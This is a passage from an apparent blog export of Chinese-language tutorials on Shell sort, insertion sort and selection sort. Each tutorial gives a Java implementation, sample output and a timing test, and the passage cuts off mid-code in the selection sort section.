      <title>希尔排序</title>
      <link href="/posts/3c6c/"/>
      <url>/posts/3c6c/</url>
      
        <content type="html"><![CDATA[<h1 id="希尔排序"><a href="#希尔排序" class="headerlink" title="希尔排序"></a>希尔排序</h1><p>直接插入排序的效率在某些时候是很高的，比如，记录本身就是基本有序的，我们只需要少量的插入操作，就可以完成整个记录集的排序工作，此时直接插入很高效。还有就是记录数比较少时，直接插入的优势也比较明显。可问题在于两个条件本身就过于苛刻，现实中记录少或者基本有序都属于特殊情况。</p><p>希尔排序是直接插入排序经过改进之后的一个更高效的版本。</p><h2 id="基本思想"><a href="#基本思想" class="headerlink" title="基本思想"></a>基本思想</h2><p>希尔排序是把记录按下标的一定增量分组，对每组使用直接插入排序算法排序；随着增量逐渐减少，每组包含的关键词越来越多，当增量减至1时，整个数组恰被分成一组，算法便终止。</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215706.png"></p><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.sort;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShellSort</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">int</span>[] arr = &#123; <span class="number">8</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">0</span> &#125;;</span><br><span class="line">        shellSort(arr);</span><br><span class="line">System.out.println(Arrays.toString(arr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">shellSort</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">gap</span> <span class="operator">=</span> arr.length / <span class="number">2</span>; gap &gt; <span class="number">0</span>; gap /= <span class="number">2</span>) &#123;</span><br><span class="line"><span class="comment">// 从第gap个元素开始，逐个对其所在的组进行直接插入排序，组里相邻元素的间隔为gap</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> gap; i &lt; arr.length; i++) &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> i;</span><br><span class="line"><span class="type">int</span> <span class="variable">insertValue</span> <span class="operator">=</span> arr[index];</span><br><span class="line"><span class="keyword">while</span> (index - gap &gt;= <span class="number">0</span> &amp;&amp; insertValue &lt; arr[index - gap]) &#123;</span><br><span class="line">arr[index] = arr[index - gap];</span><br><span class="line">index -= gap;</span><br><span class="line">&#125;</span><br><span class="line">arr[index] = insertValue;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="测试希尔插入排序的速度"><a href="#测试希尔插入排序的速度" class="headerlink" title="测试希尔插入排序的速度"></a>测试希尔插入排序的速度</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.sort;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShellSort</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">// 创建一个8000000个元素的随机的数组，8百万个元素</span></span><br><span class="line"><span class="type">int</span>[] arr = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">8000000</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">8000000</span>; i++) &#123;</span><br><span class="line">arr[i] = (<span class="type">int</span>) (Math.random() * <span class="number">8000000</span>); <span class="comment">// 生成一个[0, 8000000) 数</span></span><br><span class="line">&#125;</span><br><span class="line">        </span><br><span class="line"><span class="type">Date</span> <span class="variable">data1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line"><span class="type">SimpleDateFormat</span> <span class="variable">simpleDateFormat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">date1Str</span> <span class="operator">=</span> simpleDateFormat.format(data1);</span><br><span class="line">System.out.println(<span class="string">&quot;排序前的时间是=&quot;</span> + date1Str);</span><br><span class="line"></span><br><span class="line">shellSort(arr);</span><br><span class="line"></span><br><span class="line"><span class="type">Date</span> <span class="variable">data2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line"><span class="type">String</span> <span class="variable">date2Str</span> <span class="operator">=</span> simpleDateFormat.format(data2);</span><br><span class="line">System.out.println(<span class="string">&quot;排序后的时间是=&quot;</span> + date2Str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">shellSort</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">gap</span> <span class="operator">=</span> arr.length / <span class="number">2</span>; gap &gt; <span class="number">0</span>; gap /= <span class="number">2</span>) &#123;</span><br><span class="line"><span class="comment">// 从第gap个元素开始，逐个对其所在的组进行直接插入排序，组里相邻元素的间隔为gap</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> gap; i &lt; arr.length; i++) &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> i;</span><br><span class="line"><span class="type">int</span> <span class="variable">insertValue</span> <span class="operator">=</span> arr[index];</span><br><span class="line"><span class="keyword">while</span> (index - gap &gt;= <span class="number">0</span> &amp;&amp; insertValue &lt; arr[index - gap]) &#123;</span><br><span class="line">arr[index] = arr[index - gap];</span><br><span class="line">index -= gap;</span><br><span class="line">&#125;</span><br><span class="line">arr[index] = insertValue;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>排序前的时间是=2020-08-01 22:22:53 排序后的时间是=2020-08-01 22:22:57</code></p><p><strong>这是八百万个元素的希尔排序时间，跟前面几个算法的八万个元素排序时间差不多。</strong></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 数据结构和算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 希尔排序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>直接插入排序</title>
      <link href="/posts/4f80/"/>
      <url>/posts/4f80/</url>
      
        <content type="html"><![CDATA[<h1 id="直接插入排序"><a href="#直接插入排序" class="headerlink" title="直接插入排序"></a>直接插入排序</h1><h2 id="基本思想"><a href="#基本思想" class="headerlink" title="基本思想"></a>基本思想</h2><p>每一步将一个待排序的数据插入到前面已经排好序的有序序列中，直到插完所有元素为止。</p><blockquote><ol><li>从序列第一个元素开始，该元素可以认为已经被排序。</li><li>取出下一个元素，设为待插入元素，在已经排序的元素序列中从后向前扫描，如果该元素（已排序）大于待插入元素，将该元素移到下一位置。 </li><li>重复步骤2，直到找到已排序的元素小于或者等于待排序元素的位置，插入元素。</li><li>重复2，3步骤，完成排序。</li></ol></blockquote><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215705.png"></p><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.sort;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InsertSort</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">int</span>[] arr = &#123; <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">9</span>&#125;;</span><br><span class="line">insertSort(arr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">insertSort</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">insertValue = arr[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">while</span> (index &gt; <span class="number">0</span> &amp;&amp; insertValue &lt; arr[index - <span class="number">1</span>]) &#123;</span><br><span class="line">arr[index] = arr[index - <span class="number">1</span>];</span><br><span class="line">index--;</span><br><span class="line">&#125;</span><br><span class="line">arr[index] = insertValue;</span><br><span class="line">System.out.println(<span class="string">&quot;第1轮后：&quot;</span>);</span><br><span class="line">System.out.println(Arrays.toString(arr));</span><br><span class="line">        </span><br><span class="line">index = <span class="number">2</span>;</span><br><span class="line">insertValue = arr[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">while</span> (index &gt; <span class="number">0</span> &amp;&amp; insertValue &lt; arr[index - <span class="number">1</span>]) &#123;</span><br><span class="line">arr[index] = arr[index - <span class="number">1</span>];</span><br><span class="line">index--;</span><br><span class="line">&#125;</span><br><span class="line">arr[index] = insertValue;</span><br><span class="line">System.out.println(<span class="string">&quot;第2轮后：&quot;</span>);</span><br><span class="line">System.out.println(Arrays.toString(arr));</span><br><span class="line"></span><br><span class="line">index = <span class="number">3</span>;</span><br><span class="line">insertValue = arr[<span class="number">3</span>];</span><br><span class="line"><span class="keyword">while</span> (index &gt; <span class="number">0</span> &amp;&amp; insertValue &lt; arr[index - <span class="number">1</span>]) &#123;</span><br><span class="line">arr[index] = arr[index - <span class="number">1</span>];</span><br><span class="line">index--;</span><br><span class="line">&#125;</span><br><span class="line">arr[index] = insertValue;</span><br><span class="line">System.out.println(<span class="string">&quot;第3轮后：&quot;</span>);</span><br><span class="line">System.out.println(Arrays.toString(arr));</span><br><span class="line">        </span><br><span class="line">index = <span class="number">4</span>;</span><br><span class="line">insertValue = arr[<span class="number">4</span>];</span><br><span class="line"><span class="keyword">while</span> (index &gt; <span class="number">0</span> &amp;&amp; insertValue &lt; arr[index - <span class="number">1</span>]) &#123;</span><br><span class="line">arr[index] = arr[index - <span class="number">1</span>];</span><br><span class="line">index--;</span><br><span class="line">&#125;</span><br><span class="line">arr[index] = insertValue;</span><br><span class="line">System.out.println(<span class="string">&quot;第4轮后：&quot;</span>);</span><br><span class="line">System.out.println(Arrays.toString(arr));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><p>第1轮后：<br>[4, 6, 8, 5, 9]<br>第2轮后：<br>[4, 6, 8, 5, 9]<br>第3轮后：<br>[4, 5, 6, 8, 9]<br>第4轮后：<br>[4, 5, 6, 8, 9]</p><h2 id="整合代码"><a href="#整合代码" class="headerlink" title="整合代码"></a>整合代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.sort;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InsertSort</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">int</span>[] arr = &#123; <span class="number">101</span>, <span class="number">34</span>,-<span class="number">1</span>, <span class="number">119</span>, <span class="number">1</span> ,-<span class="number">2</span>&#125;;</span><br><span class="line">insertSort(arr); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">insertSort</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line"><span class="type">int</span> index,insertValue;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">index = i;</span><br><span class="line">insertValue = arr[i];</span><br><span class="line"><span class="keyword">while</span> (index &gt; <span class="number">0</span> &amp;&amp; insertValue &lt; arr[index - <span class="number">1</span>]) &#123;</span><br><span class="line">arr[index] = arr[index - <span class="number">1</span>];</span><br><span class="line">index--;</span><br><span class="line">&#125;</span><br><span class="line">arr[index] = insertValue;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="测试直接插入排序的速度"><a href="#测试直接插入排序的速度" class="headerlink" title="测试直接插入排序的速度"></a>测试直接插入排序的速度</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.sort;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InsertSort</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">// 创建一个80000个元素的随机的数组</span></span><br><span class="line"><span class="type">int</span>[] arr = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">80000</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">80000</span>; i++) &#123;</span><br><span class="line">arr[i] = (<span class="type">int</span>) (Math.random() * <span class="number">8000000</span>); <span class="comment">// 生成一个[0, 8000000) 数</span></span><br><span class="line">&#125;</span><br><span class="line">        </span><br><span class="line"><span class="type">Date</span> <span class="variable">data1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line"><span class="type">SimpleDateFormat</span> <span class="variable">simpleDateFormat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">date1Str</span> <span class="operator">=</span> simpleDateFormat.format(data1);</span><br><span class="line">System.out.println(<span class="string">&quot;排序前的时间是=&quot;</span> + date1Str);</span><br><span class="line"></span><br><span class="line">insertSort(arr); </span><br><span class="line"></span><br><span class="line"><span class="type">Date</span> <span class="variable">data2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line"><span class="type">String</span> <span class="variable">date2Str</span> <span class="operator">=</span> simpleDateFormat.format(data2);</span><br><span class="line">System.out.println(<span class="string">&quot;排序后的时间是=&quot;</span> + date2Str);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">insertSort</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line"><span class="type">int</span> index,insertValue;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">index = i;</span><br><span class="line">insertValue = arr[i];</span><br><span class="line"><span class="keyword">while</span> (index &gt; <span class="number">0</span> &amp;&amp; insertValue &lt; arr[index - <span class="number">1</span>]) &#123;</span><br><span class="line">arr[index] = arr[index - <span class="number">1</span>];</span><br><span class="line">index--;</span><br><span class="line">&#125;</span><br><span class="line">arr[index] = insertValue;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>排序前的时间是=2020-07-31 20:02:36 排序后的时间是=2020-07-31 20:02:38</code></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 数据结构和算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 直接插入排序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>简单选择排序</title>
      <link href="/posts/389d/"/>
      <url>/posts/389d/</url>
      
        <content type="html"><![CDATA[<h1 id="简单选择排序"><a href="#简单选择排序" class="headerlink" title="简单选择排序"></a>简单选择排序</h1><h2 id="基本思想"><a href="#基本思想" class="headerlink" title="基本思想"></a>基本思想</h2><p>在a[1]-a[n-1]中选择最小的元素和a[0]交换；<br>在a[2]-a[n-1]中选择最小的元素和a[1]交换；<br>……<br>在a[i]-a[n-1]中选择最下的元素和a[i-1]交换；</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215029.gif"></p><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.sort;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SelectSort</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">int</span> arr[] = &#123; <span class="number">101</span>, <span class="number">34</span>, <span class="number">119</span>, <span class="number">1</span> &#125;;</span><br><span class="line">        <span class="comment">// 每i轮确定第i个元素为最小值</span></span><br><span class="line">selectSort(arr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">selectSort</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">minIndex</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">min</span> <span class="operator">=</span> arr[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> + <span class="number">1</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (arr[i] &lt; min) &#123;</span><br><span class="line">minIndex = i;</span><br><span class="line">min = arr[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (minIndex != <span class="number">0</span>) &#123;</span><br><span class="line">arr[minIndex] = arr[<span class="number">0</span>];</span><br><span class="line">arr[<span class="number">0</span>] = min;</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">&quot;第一轮后：&quot;</span>);</span><br><span class="line">System.out.println(Arrays.toString(arr));</span><br><span class="line"></span><br><span class="line">minIndex = <span class="number">1</span>;</span><br><span class="line">min = arr[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span> + <span class="number">1</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (arr[i] &lt; min) &#123;</span><br><span class="line">minIndex = i;</span><br><span class="line">min = arr[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (minIndex != <span class="number">1</span>) &#123;</span><br><span class="line">arr[minIndex] = arr[<span class="number">1</span>];</span><br><span class="line">arr[<span class="number">1</span>] = min;</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">&quot;第二轮后：&quot;</span>);</span><br><span class="line">System.out.println(Arrays.toString(arr));</span><br><span class="line"></span><br><span class="line">minIndex = <span class="number">2</span>;</span><br><span class="line">min = arr[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">2</span> + <span class="number">1</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (arr[i] &lt; min) &#123;</span><br><span class="line">minIndex = i;</span><br><span class="line">min = arr[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (minIndex != <span class="number">2</span>) &#123;</span><br><span class="line">arr[minIndex] = arr[<span class="number">2</span>];</span><br><span class="line">arr[<span class="number">2</span>] = min;</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">&quot;第三轮后：&quot;</span>);</span><br><span class="line">System.out.println(Arrays.toString(arr));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><p>第1轮后：<br>[1, 34, 119, 101]<br>第2轮后：<br>[1, 34, 119, 101]<br>第3轮后：<br>[1, 34, 101, 119]</p><h2 id="整合代码"><a href="#整合代码" class="headerlink" title="整合代码"></a>整合代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.sort;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SelectSort</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">int</span> arr[] = &#123; <span class="number">101</span>, <span class="number">34</span>, <span class="number">119</span>, <span class="number">1</span> &#125;;</span><br><span class="line">selectSort(arr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">selectSort</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; arr.length - <span class="number">1</span>; j++) &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">minIndex</span> <span class="operator">=</span> j;</span><br><span class="line"><span class="type">int</span> <span class="variable">min</span> <span class="operator">=</span> 